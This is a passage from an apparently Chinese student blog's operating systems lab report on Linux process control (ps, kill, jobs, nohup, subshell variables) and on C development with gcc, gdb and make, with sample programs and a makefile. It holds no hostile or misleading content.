href="#6、前台和后台" class="headerlink" title="6、前台和后台"></a>6、前台和后台</h4><p>前台进程是指正在对它进行交互操作的进程——它从键盘接收输入，并将输出送往屏幕（当然，用户可以对输入输出进行重新定向）。有一些进程需要很长时间才能结束，并且运行起来很单调乏味。编译程序就是一个这样的进程。在后台运行它们就可以了。</p><h4 id="7、进程状态及转换"><a href="#7、进程状态及转换" class="headerlink" title="7、进程状态及转换"></a>7、进程状态及转换</h4><h5 id="⑴-进程的基本状态"><a href="#⑴-进程的基本状态" class="headerlink" title="⑴ 进程的基本状态"></a>⑴ 进程的基本状态</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030112916303.png" alt="image-20211030112916303"></p><h5 id="⑵-linux系统进程状态"><a href="#⑵-linux系统进程状态" class="headerlink" title="⑵ linux系统进程状态"></a>⑵ linux系统进程状态</h5><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030112940312.png" alt="image-20211030112940312"></p><h4 id="8、父子进程"><a href="#8、父子进程" class="headerlink" title="8、父子进程"></a>8、父子进程</h4><p>进程在其执行过程中，能通过系统调用创建多个新进程。创建进程成为父进程，而新进程称为该进程的子进程。</p><h4 id="9、命令简介"><a href="#9、命令简介" class="headerlink" title="9、命令简介"></a>9、命令简介</h4><h5 id="⑴-Ps（Process-Status）"><a href="#⑴-Ps（Process-Status）" class="headerlink" title="⑴ Ps（Process Status）"></a>⑴ Ps（Process Status）</h5><p>查看目前的系统中有哪些进程正在执行，以及它们的执行情况。<br>语法：ps [任选参数]<br>常用参数:<br>ps或ps -x 查看系统中，属于自己的进程。<br>ps -au 查看系统中，所有用户的进程。<br>ps -aux 查看系统中，包含系统内部的及所有用户的进程。</p><h5 id="⑵-top"><a href="#⑵-top" class="headerlink" title="⑵ top"></a>⑵ top</h5><p>动态显示进程，实时监测进程状态。<br>常用操作：<br>q：退出top命令。<br>m：切换显示内存信息。<br>t：切换显示进程和CPU状态信息。<br>c：切换显示命令名称和完整命令行。<br>W：将当前设置写入~/.toprc文件中。这是写top配置文件的推荐方法。</p><h5 id="⑶-kill"><a href="#⑶-kill" class="headerlink" title="⑶ kill"></a>⑶ kill</h5><p>Kill命令可以传送的信号有很多种，但以SIGTERM（15）或SIGKILL（9）居多，它们都是用来结束进程执行的。<br>语法：kill [-9] PID<br>PID：利用ps 命令所查出的进程号。<br>例如:<br>kill 456或kill -9 456 终止进程号为456 的进程。<br>语法：kill %n<br>n：利用jobs命令查看出的后台作业号<br>结束或终止后台中的进程</p><h5 id="⑷-amp"><a href="#⑷-amp" class="headerlink" title="⑷ &amp;"></a>⑷ &amp;</h5><p>在后台执行进程的方式<br>语法：命令&amp;</p><h5 id="⑸-jobs"><a href="#⑸-jobs" class="headerlink" title="⑸ jobs"></a>⑸ jobs</h5><p>显示当前会话的作业状态。<br>语法<br>jobs [ -l | -n | -p ] [ JobID … ]</p><h5 id="⑹-外壳变量"><a href="#⑹-外壳变量" class="headerlink" title="⑹ 外壳变量"></a>⑹ 外壳变量</h5><p>查看外壳变量的设定值<br>语法：set 查看所有外壳变量的设定值。<br>语法：echo $变量名显示指定的外壳变量的设定值。</p><p>设定外壳变量<br>语法：set var = value<br>删除外壳变量<br>语法：unset var</p><h5 id="⑺-查看系统中的用户"><a href="#⑺-查看系统中的用户" class="headerlink" title="⑺ 查看系统中的用户"></a>⑺ 查看系统中的用户</h5><p>Who命令主要用于查看当前登录的用户情况。<br>语法： who [-imqsuwHT][- -count][- -heading][- -help][- -<br>message][- -mesg][- -version][- -writable][file][am i]<br>⑻查看当前系统上所有工作站的用户<br>语法: rusers<br>按Ctrl+D&gt; 结束</p><h3 id="四、实验内容-1"><a href="#四、实验内容-1" class="headerlink" title="四、实验内容"></a>四、实验内容</h3><h4 id="1-进程的结构"><a href="#1-进程的结构" class="headerlink" title="1. 进程的结构"></a>1. 进程的结构</h4><p><strong>(1) 登录进程系统，显示当前的进程ID</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030125913051.png" alt="image-20211030125913051"></p><p><strong>(2) 创建一个子shell</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030130010739.png" alt="image-20211030130010739"></p><p><strong>(3) 执行<code>ls -R / &gt; outfile2 2&gt;&gt; errfile &amp;</code>命令后，立即再运行一个命令，列出你的所有正在运行的进程。</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030130949729.png" alt="image-20211030130949729"></p><p><strong>(4) 使用exit命令，中止你的子shell进程。如果再次使用exit命令，退出你的登录shell，此时，发生了什么？</strong></p><p>一次exit后回到用户，连续用两次exit后终端关闭。</p><p><strong>(5) 显示出当前进程环境中的所有变量</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030131133059.png" alt="image-20211030131133059"></p><p><strong>(6) 创建一个变量x，并将它的值赋为10,查看变量x的值,再次列出你的当前进程环境中的所有变量</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030131337702.png" alt="image-20211030131337702"></p><p>我们发现x=10出现在了环境变量中</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030131444720.png" alt="image-20211030131444720"></p><p><strong>(7) 创建一个子shell。查看子shell中变量x的值。它的值是多少？列出子shell中所有的当前变量，有变量x吗？</strong></p><p>子shell中变量x值为空，子shell中没有变量x</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030132032214.png" alt="image-20211030132032214"></p><p><strong>(8) 返回到父进程。将变量x的值传递给子进程。创建一个子shell，并且查看变量x的值。</strong></p><p>子shell中变量x变成了10</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030132658588.png" alt="image-20211030132658588"></p><p><strong>(9) 在子shell中将200赋给变量x。查看变量的值是否已经改变了</strong></p><p>变成了200</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030132753073.png" alt="image-20211030132753073"></p><p><strong>(10) 回到父进程中。查看当前环境中，变量x的值。子shell中对变量x的值的改变，上传到了父shell中吗</strong></p><p>父进程仍然为10， 子shell对变量x的改变没有上传到父shell。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030132838620.png" alt="image-20211030132838620"></p><p><strong>(11) 创建一个shell脚本，将其命名为sc1，它的内容应是：pwd ; cd / ; pwd</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030133043339.png" alt="image-20211030133043339"></p><p><strong>(12) 将文件sc1设置成可执行，而后运行该文件。你现在处于哪个目录中呢？为什么？</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030133355098.png" alt="image-20211030133355098"></p><p>依旧在当前目录</p><p>因为用./方式运行脚本，就相当于启动了一个子进程，在 子进程里进入了根目录，但是当前进程仍在当前目录，脚本执行完的时候子进程结束了 ，会回到当前进程，也就是回到了当前目录。</p><p> <strong>(13) 创建另一个名为sc2的shell脚本。它的内容是：var1=hello;var2=$LOGNAME;export var1 var2</strong> </p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030133517973.png" alt="image-20211030133517973"></p><p><strong>(14) 将文件sc2设置成可执行，而后运行该文件。运行结束后，查看变量var1与var2的值。var1与var2的值分别为多少？为什么？</strong></p><p>值为空</p><p>因为用./方式运行脚本，就相当于启动了一个子进程，在脚本里设置的环境变量只在这个子进程里有效，脚本执行完的时候子进程结束了 脚本里的环境变量以及别的变量都会消失。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030133653527.png" alt="image-20211030133653527"></p><p><strong>(15) 再次运行文件sc2。 此次，使用’.’命令，强迫该文件在当前shell中运行。运行结束后，查看变量var1与var2的值。现在var1与var2的值分别为多少？为什么？</strong></p><p>. sc2会强制该文件在当前shell执行，所以设置的变量仍在当前shell进程。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030133737229.png" alt="image-20211030133737229"></p><h4 id="2-作业控制"><a href="#2-作业控制" class="headerlink" title="2. 作业控制"></a>2. 作业控制</h4><p><strong>(1) 在前台执行命令ls –R / &gt; outfile 2&gt; errfile</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030135325815.png" alt="image-20211030135325815"></p><p><strong>(2) 暂停这个你刚刚启动的作业</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030135339362.png" alt="image-20211030135339362"></p><p><strong>(3) 将上面暂停的作业转至后台继续运行</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030135402168.png" alt="image-20211030135402168"></p><p><strong>(4) 把这个作业转到前台来</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030135432502.png" alt="image-20211030135432502"></p><p><strong>(5) 当ls命令执行结束时，在后台重新启动它。显示出进程的ID，而后退出系统</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030140208832.png" alt="image-20211030140208832"></p><p><strong>(6) 重新登录进来，查看该后台进程是否仍在运行</strong></p><p>没有在继续执行</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030140339679.png" alt="image-20211030140339679"></p><p><strong>(7) 创建一个包含如下内容的shell脚本文件sc3</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030142215744.png" alt="image-20211030142215744"></p><p><strong>将它置为可执行。使用nohup命令运行该文件，并将其放在后台运行（将输出重定向到sc3.out，将错误输出重定向到sc3err）。然后退出系统。</strong></p><p>用ps打印当前正在执行的进程，记下进程号，然后关闭</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030143202728.png" alt="image-20211030143202728"></p><p><strong>(8) 再次登录进来，用top查看进程是否仍在运行</strong></p><p>用top -p 12062查看指定的sleep进程发现进程仍在运行</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030143224175.png" alt="image-20211030143224175"></p><p><strong>(9) 进程完成后，显示输出文件outfile的内容</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030142118969.png" alt="image-20211030142118969"></p><p>文件过大，无法完全显示</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030142054634.png" alt="image-20211030142054634"></p><h4 id="3-结束一个进程"><a href="#3-结束一个进程" class="headerlink" title="3. 结束一个进程"></a>3. 结束一个进程</h4><p><strong>(1) 使用ls –R / 命令（将错误重定向，将输出重定向），在后台启动这个运行时间很长的作业。请记录该后台进程的ID号</strong></p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030144817392.png" alt="image-20211030144817392"></p><p><strong>(2) 在知道进程ID的情况下，杀死这个进程。确认你已经杀死了该进程</strong><br><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030144834597.png" alt="image-20211030144834597"></p><h4 id="4-查看用户信息"><a href="#4-查看用户信息" class="headerlink" title="4. 查看用户信息"></a>4. 查看用户信息</h4><p><strong>(1) 查看目前在系统中登录的所有用户清单</strong><br><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030145609431.png" alt="image-20211030145609431"><br><strong>(2) 显示登陆者信息</strong><br><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030145623590.png" alt="image-20211030145623590"></p><h2 id="实验6-C编程和调试"><a href="#实验6-C编程和调试" class="headerlink" title="实验6 C编程和调试"></a>实验6 C编程和调试</h2><h3 id="一、实验目的-2"><a href="#一、实验目的-2" class="headerlink" title="一、实验目的"></a>一、实验目的</h3><ul><li>使用户熟悉C编程工具gcc、gdb、make</li><li>熟练掌握gcc、gdb、make ，为后续项目作准备</li></ul><h3 id="二、实验要求-2"><a href="#二、实验要求-2" class="headerlink" title="二、实验要求"></a>二、实验要求</h3><ul><li>熟悉gcc编译四阶段，习惯gcc界面与查错，用gcc编译一个示例程序。</li><li>熟悉gdb常见调试命令，用gdb调试一个示例程序，熟悉调试环境。</li><li>熟悉make和makefile规则，通过查看一个示例程序makefile，学会用makefile管理自己的项目。</li></ul><h3 id="三、实验预备知识-2"><a href="#三、实验预备知识-2" class="headerlink" title="三、实验预备知识"></a>三、实验预备知识</h3><h4 id="1-Gcc"><a href="#1-Gcc" class="headerlink" title="1. Gcc"></a>1. Gcc</h4><p>GNU C编译器（GCC）是一个在Unix或linux等系统上运行的功能强大的编译器，主要用于对C/C++/Object C等语言的编译。</p><h5 id="1-GCC提供的各种程序以及各个头文件的位置"><a href="#1-GCC提供的各种程序以及各个头文件的位置" class="headerlink" title="(1) GCC提供的各种程序以及各个头文件的位置"></a>(1) GCC提供的各种程序以及各个头文件的位置</h5><ul><li>/usr/lib/gcc-lib/target/version/及其子目录 ，大部分的编译器都被放在这个地方 。</li><li>/usr/bin/gcc 这里装的是编译器的驱动程序。</li><li>/lib与/usr/lib 这两个目录与另外的一些目录都是本地系统的程序库目录。</li><li>/usr/include/及其子目录 这些目录下的头文件大部分都是由libe套件（libe binary package）所提供的。</li></ul><h5 id="2-GCC用法"><a href="#2-GCC用法" class="headerlink" title="(2) GCC用法"></a>(2) GCC用法</h5><p>使用GCC时通常在其后面跟上一些编译选项以及要编译的文件名，以下给出的是GCC的基本用法：gcc [option] [filename]</p><h5 id="3-GCC的主要选项"><a href="#3-GCC的主要选项" class="headerlink" title="(3) GCC的主要选项"></a>(3) GCC的主要选项</h5><ul><li>-x language 指定使用的语言（c、c++或汇编）；</li><li>-c 只对文件进行编译和汇编，但不连接；</li><li>-S 只对文件进行编译，但不汇编和连接；</li><li>-E 只对文件进行预处理，但不编译、汇编和连接；</li><li>-O[file1] file2 将文件file2编译成可执行文件file1;</li><li>-l library 用来指定所使用的库文件；</li><li>-I directory 为include文件的搜索指定目录；</li><li>-W 禁止警告信息</li><li>-pedantic 严格要求符合ANSI标准；</li><li>-Wall 显示附加的警告信息。</li><li>-g 显示排错信息以用于gdb；</li><li>-p 产生prof所需的信息；</li><li>-pg 产生gprof 所使用的信息；</li></ul><h4 id="2-Gdb"><a href="#2-Gdb" class="headerlink" title="2. Gdb"></a>2. Gdb</h4><p>gdb是一个用来调试c和c++程序的功能比较强大的调试器。</p><h5 id="1-在gdb中有关调试过程中显示数据的命令有以下几条"><a href="#1-在gdb中有关调试过程中显示数据的命令有以下几条" class="headerlink" title="(1) 在gdb中有关调试过程中显示数据的命令有以下几条"></a>(1) 在gdb中有关调试过程中显示数据的命令有以下几条</h5><ul><li>display命令，用来显示一些表达式的值。</li><li>info display命令，用来显示当前所有的要显示值的表达式的有关情况。</li><li>delete display命令 用来删除一个要显示值的表达式 。</li><li>disable display 使一个要显示值的表达式暂时无效，但并不删除该表达式的显示。</li><li>enable display 它与disable display命令相反，使显示值被屏蔽的表达式恢复显示 。</li><li>undisplay 这个命令用来结束某个表达式值的显示，它的功能和delete display基本一致 。</li><li>whatis 用来显示某个表达式的数据类型。</li><li>set命令 用来为变量赋值。</li></ul><h5 id="2-gdb中有关文件的命令"><a href="#2-gdb中有关文件的命令" class="headerlink" title="(2) gdb中有关文件的命令"></a>(2) gdb中有关文件的命令</h5><ul><li>add-shared-symbol-files 用来从动态的连接映射的共享目标文件中装入符号表。</li><li>add-symbol-file 用来从已经动态装入的文件中装入符号表。</li><li>cd 用来改变当前工作目录，和shell里的cd命令是一样的。</li><li>core-file 使某个文件成为core dump，从而可以检验内存和寄存器。</li><li>directory 用来向源文件搜索路径中增加一个目录。</li><li>pwd pwd命令和shell中的pwd命令的功能是一样的，二者都是用来显示当前工作路径的。</li></ul><h5 id="3-gdb中有关程序运行的命令"><a href="#3-gdb中有关程序运行的命令" class="headerlink" title="(3) gdb中有关程序运行的命令"></a>(3) gdb中有关程序运行的命令</h5><ul><li>cont cont命令和continue命令的功能是一样的，它使程序在信号发生后或是停在断点之后再继续运行。</li><li>handle 用来对信号设置处理函数。</li><li>jump 指定程序开始调试的指令或地址。</li><li>kill kill命令用来结束当前程序的调试。</li><li>next是用来继续程序的运行。</li><li>nexti 用来单步执行一条指令的。</li><li>step用来执行一条语句。</li><li>stepi 用来执行一条指令。</li></ul><h4 id="3-make"><a href="#3-make" class="headerlink" title="3. make"></a>3. make</h4><p>make命令通过makefile文件来描述源程序之间的相互关系并自动维护编译工作。<br>make命令本身可带有四种参数：标志、宏定义、描述文件名和目标文件名。</p><p>其标准形式为：make [flags] [macro definitions] [targets]。</p><h3 id="四、实验内容-2"><a href="#四、实验内容-2" class="headerlink" title="四、实验内容"></a>四、实验内容</h3><h4 id="1-Gcc-1"><a href="#1-Gcc-1" class="headerlink" title="1. Gcc"></a>1. Gcc</h4><p><strong>(1) 用熟悉的编辑器输入清单1所示的代码:</strong></p><p>清单1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Hello world, Linux programming!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后执行下面的命令编译和运行这段程序：</p><p>$ gcc hello.c -o hello</p><p>$./hello</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030151540494.png" alt="image-20211030151540494"><br>使用GCC编译程序时，编译过程可被细分为四个阶段 ：<br>预处理（Pre-Processing） # gcc -E hello.c -o hello.i<br>编译（Compiling） # gcc -c hello.i -o hello.o<br>汇编（Assembling）<br>链接（Linking) # gcc hello.o -o hello</p><p><strong>(2) 使用gcc发现程序错误</strong></p><p>清单2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//illcode.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> var = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It is not standard C code!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当GCC在编译不符合ANSI/ISO C语言标准的源代码时，如果加上了-pedantic选项，那么使用了扩展语法的地方将产生相应的警告信息：</p><p>$ gcc -pedantic illcode.c -o illcode</p><p>illcode.c: In function ‘main’:<br>illcode.c:9: ISO C89 does not support ‘long long’<br>illcode.c:8: return type of ‘main’ is not ‘int’</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211030152031454.png" alt="image-20211030152031454"></p><h4 id="2-Gdb-1"><a href="#2-Gdb-1" class="headerlink" title="2. Gdb"></a>2. Gdb</h4><p>下面用一个实例介绍怎样用gdb调试程序。程序清单见教程。<br>用gcc编译它：gcc -g -o test test.c</p><p>程序执行时显示如下结果：<br>The string is hello there<br>The string printed backward is</p><p>输出的第一行是正确的，但第二行打印出并不是我们所期望的。my_print2 函数没有正常工作。现在，让我们用gdb看看问题究竟出在哪儿，先输入如下命令：<br>gdb greeting。</p><p>如果输入命令时忘了把要调试的程序作为参数传给gdb，可以在gdb提示符下用file命令加载它：(gdb) file greeting。这个命令加载greeting可执行文件，就像在gdb命令行里加载它一样</p><p>选择自己的test.c文件调试</p><p>-g 加入调试信息并进入调试界面：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image018.png" alt="img">  直接运行：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image020.png" alt="img">  加入断点并查看断点：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image022.png" alt="img">  用run执行，并用next查看下一条指令：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image024.png" alt="img">  用step深入函数内部：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image026.png" alt="img">  用list查看函数代码：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image028.png" alt="img">  用delete 1 删除断点并用info break重新查看断点:  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image030.png" alt="img">  用print查看某一变量具体的值：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image032.png" alt="img">  用x查看某一内存地址具体的值：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image034.png" alt="img">  用disas反汇编某一函数：  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image036.png" alt="img">  <img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/clip_image038.png" alt="img">     </p><h4 id="3-make-1"><a href="#3-make-1" class="headerlink" title="3. make"></a>3. make</h4><p>在Linux系统中，专门提供了一个make命令来自动维护目标文件。<br>以下是一个简单的Makefile的简单例子：<br>prog:prog1.o prog2.o<br>gcc prog1.o prog2.o -o prog<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o prog1.o prog1.c<br>prog2.o:prog2.c<br>gcc -c prog2.c</p><p>测试例子</p><p>makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">test: test1.o test2.o </span><br>gcc -Wall test1.o test2.o -o test<br>    <br><span class="hljs-section">test1.o: test1.c test2.h</span><br>gcc -c -Wall test1.c -o test1.o<br><br><span class="hljs-section">test2.o: test2.c test2.h</span><br>gcc -c -Wall test2.c -o test2.o<br><br><span class="hljs-section">clean: </span><br>    rm -rf *.o test<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test1.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;test2.h&quot;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is test1!\n&quot;</span>);<br>    PrintTest2();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//test2.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;test2.h&quot;</span></span><br><span class="hljs-function"><span 